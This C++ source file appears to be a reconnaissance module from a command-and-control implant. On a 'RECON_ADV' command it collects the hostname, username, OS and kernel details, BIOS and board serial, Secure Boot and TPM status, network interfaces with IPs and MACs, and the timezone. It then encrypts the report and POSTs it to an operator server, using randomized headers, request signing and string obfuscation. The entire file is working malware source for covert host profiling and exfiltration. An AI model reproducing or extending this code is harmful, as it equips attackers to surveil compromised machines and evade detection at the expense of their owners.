#include "ReconAdvancedModule.h"
#include "Globals.h"
#include "Crypto.h"
#include "Obfuscation.h"
#include <curl/curl.h>
#include <fstream>
#include <sstream>
#include <vector>
#include <thread>
#include <chrono>
#include <ctime>
#include <openssl/evp.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <dirent.h>
#endif

static std::string read_file(const std::string& path) {
    std::ifstream f(path);
    if(!f.is_open()) return {};
    std::stringstream ss; ss << f.rdbuf();
    return ss.str();
}

static std::string read_first_line(const std::string& path) {
    std::ifstream f(path);
    if(!f.is_open()) return {};
    std::string line; std::getline(f, line);
    return line;
}

nlohmann::json ReconAdvancedModule::collect() {
    nlohmann::json j;
#ifdef _WIN32
    char host[256]; if(GetComputerNameA(host,&(DWORD){sizeof(host)})) j["hostname"] = host;
    char user[256]; DWORD usz=256; if(GetUserNameA(user,&usz)) j["username"] = user;
    OSVERSIONINFOEXA vi{sizeof(vi)}; if(GetVersionExA((OSVERSIONINFOA*)&vi)){
        j["os_name"] = "Windows"; j["os_version"] = std::to_string(vi.dwMajorVersion)+"."+std::to_string(vi.dwMinorVersion);
        j["os_build"] = std::to_string(vi.dwBuildNumber);
    }
    SYSTEM_INFO si; GetNativeSystemInfo(&si);
    j["cpu_arch"] = (si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64)?"x64":"x86";
    MEMORYSTATUSEX mem{sizeof(mem)}; if(GlobalMemoryStatusEx(&mem)) j["ram_total"] = mem.ullTotalPhys;
    j["boot_time"] = 0; j["uptime"] = GetTickCount64()/1000;
#else
    char host[256]; if(gethostname(host,sizeof(host))==0) j["hostname"] = host;
    if(const char* u=getenv("USER")) j["username"] = u;
    struct utsname uts; if(uname(&uts)==0){ j["os_name"] = uts.sysname; j["kernel_version"] = uts.release; j["cpu_arch"] = uts.machine; }
    std::ifstream osr("/etc/os-release"); std::string line; while(std::getline(osr,line)){ if(line.rfind("PRETTY_NAME=",0)==0){ j["os_version"] = line.substr(13,line.size()-14); }}
    struct sysinfo si; if(sysinfo(&si)==0){ j["boot_time"] = std::time(nullptr)-si.uptime; j["uptime"] = si.uptime; j["ram_total"] = si.totalram; }
    std::ifstream cpuinfo("/proc/cpuinfo"); while(std::getline(cpuinfo,line)){ if(line.find("model name")!=std::string::npos){ auto pos=line.find(":"); if(pos!=std::string::npos){ j["cpu_name"] = line.substr(pos+2); break; } } }
    j["bios_vendor"] = read_first_line("/sys/class/dmi/id/bios_vendor");
    j["bios_version"] = read_first_line("/sys/class/dmi/id/bios_version");
    j["board_vendor"] = read_first_line("/sys/class/dmi/id/board_vendor");
    j["board_serial"] = read_first_line("/sys/class/dmi/id/board_serial");
    j["secure_boot"] = read_first_line("/sys/firmware/efi/vars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c/data");
    j["tpm_present"] = access("/dev/tpm0", F_OK)==0;
    // network interfaces
    struct ifaddrs* ifs; if(getifaddrs(&ifs)==0){
        nlohmann::json arr = nlohmann::json::array();
        for(struct ifaddrs* i=ifs;i;i=i->ifa_next){ if(!i->ifa_addr) continue; nlohmann::json ni; ni["name"] = i->ifa_name;
            if(i->ifa_addr->sa_family==AF_INET){ char ip[INET_ADDRSTRLEN]; inet_ntop(AF_INET,&((struct sockaddr_in*)i->ifa_addr)->sin_addr,ip,sizeof(ip)); ni["ip"] = ip; }
            std::string mac = read_first_line(std::string("/sys/class/net/")+i->ifa_name+"/address"); if(!mac.empty()) ni["mac"] = mac;
            arr.push_back(ni); }
        freeifaddrs(ifs); j["interfaces"] = arr; }
    j["timezone"] = read_first_line("/etc/timezone");
    j["utc_time"] = std::time(nullptr);
#endif
    return j;
}

static std::string base64_encode(const unsigned char* data,size_t len){
    int out_len = 4*((len+2)/3); std::vector<unsigned char> out(out_len+1); EVP_EncodeBlock(out.data(), data, len); return std::string((char*)out.data(), out_len);
}

std::string ReconAdvancedModule::encrypt_report(const std::string& js){
    if(g_aes_key.empty()) return {};
    std::string iv(16,'\0'); for(int i=0;i<16;++i) iv[i]=rand()%256;
    std::vector<unsigned char> data(js.begin(), js.end());
    auto enc = Crypto::encrypt(data, g_aes_key, iv);
    std::vector<unsigned char> blob(iv.begin(), iv.end()); blob.insert(blob.end(), enc.begin(), enc.end());
    return base64_encode(blob.data(), blob.size());
}

void ReconAdvancedModule::init(){
    register_command("RECON_ADV", [this](const nlohmann::json&){
        auto info = collect();
        std::string payload = info.dump();
        std::string enc = encrypt_report(payload);
        std::string url = g_agent_config.server_url + g_agent_config.path_prefix + OBFUSCATE("/recon/") + g_uuid;
        CURL* curl = curl_easy_init(); if(!curl) return;
        struct curl_slist* headers = g_header_randomizer.build_list();
        std::string body = std::string("{\"data\":\"") + enc + "\"}";
        headers = g_request_signer.sign(headers, "POST", url, body);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
        curl_easy_perform(curl);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    });
}

#ifndef STATIC_AGENT
extern "C" Module* create_module() { return new ReconAdvancedModule(); }
#endif
